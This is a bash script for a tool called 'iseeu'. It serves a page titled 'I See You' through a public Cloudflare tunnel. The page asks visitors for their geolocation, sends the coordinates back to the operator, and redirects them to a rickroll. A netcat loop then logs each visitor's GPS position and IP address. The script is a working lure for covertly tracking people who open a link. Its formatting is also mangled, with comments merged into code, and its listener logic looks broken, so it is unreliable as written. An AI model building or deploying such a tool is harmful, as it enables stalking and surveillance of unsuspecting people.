#!/bin/bash

clear

Prompt for port

read -p "[?] Enter port to use for local server (default 8080): " PORT PORT=${PORT:-8080}

WEB_DIR="$HOME/webpage" LOG_DIR="$HOME/iseeu/logs" mkdir -p "$WEB_DIR" "$LOG_DIR" TIMESTAMP=$(date '+%Y-%m-%d_%H-%M-%S') LOG_FILE="$LOG_DIR/log_$TIMESTAMP.txt" CF_LOG="$HOME/iseeu/cf_output.log"

Kill old processes

echo "[*] Killing old servers..." pkill -f "python3 -m http.server" 2>/dev/null pkill -f cloudflared 2>/dev/null

Create HTML

cat <<EOF > "$WEB_DIR/index.html"

<!DOCTYPE html><html>
<head>
    <title>I See You</title>
    <script>
        function redirectToRickRoll(position) {
            fetch('/logme/' + position.coords.latitude + ',' + position.coords.longitude);
            window.location.href = 'https://shattereddisk.github.io/rickroll/rickroll.mp4';
        }
        function failLocation() {
            alert("Location access denied.");
        }
        navigator.geolocation.getCurrentPosition(redirectToRickRoll, failLocation);
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
EOFStart server

cd "$WEB_DIR" || exit 1 echo "[*] Starting HTTP server on port $PORT..." python3 -m http.server "$PORT" > /dev/null 2>&1 & SERVER_PID=$!

Start Cloudflared

echo "[*] Starting Cloudflared tunnel..." rm -f "$CF_LOG" cloudflared tunnel --url "http://localhost:$PORT" --logfile "$CF_LOG" > "$CF_LOG" 2>&1 & CF_PID=$!

Wait for public URL

echo -n "[*] Waiting for Cloudflared URL" for i in {1..10}; do sleep 1 echo -n "." URL=$(grep -oE "https://[^"]+.trycloudflare.com" "$CF_LOG" | head -n1) [[ -n "$URL" ]] && break done echo

if [[ -z "$URL" ]]; then echo "[✗] Failed to get public URL." kill "$SERVER_PID" "$CF_PID" exit 1 fi

echo "[✓] Public URL: $URL" echo "[] Logging to $LOG_FILE..." echo "[] Press Ctrl+C to stop."

Trap cleanup

cleanup() { echo "\n[] Cleaning up..." kill "$SERVER_PID" "$CF_PID" 2>/dev/null rm -f "$CF_LOG" echo "[] Done." exit } trap cleanup INT

Listen for GPS/IP log requests

while true; do nc -l -p "$PORT" | while read line; do if [[ "$line" == "/logme/" ]]; then GPS=$(echo "$line" | cut -d' ' -f2 | cut -d'/' -f3) IP=$(echo "$line" | grep -oE '[0-9]+.[0-9]+.[0-9]+.[0-9]+') echo "[$(date)] GPS: $GPS | IP: $IP" | tee -a "$LOG_FILE" fi done sleep 0.5 done

